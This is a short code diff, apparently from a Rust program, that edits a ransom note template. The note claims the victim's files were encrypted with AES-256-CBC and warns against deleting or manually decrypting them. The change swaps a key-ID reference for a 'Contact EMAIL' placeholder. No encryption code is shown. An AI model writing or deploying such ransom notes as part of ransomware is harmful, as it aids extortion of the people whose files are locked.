@@ -154,9 +154,7 @@ r#"╔════════════════════════�
 All your important files have been encrypted using AES-256-CBC.
 
 To decrypt your files, you need the decryption key.
-Contact the administrator with the key ID.
-
-Key ID (for reference): {}
+Contact EMAIL.
 
 ⚠️  DO NOT delete encrypted files or this note.
 ⚠️  DO NOT attempt to decrypt files manually.
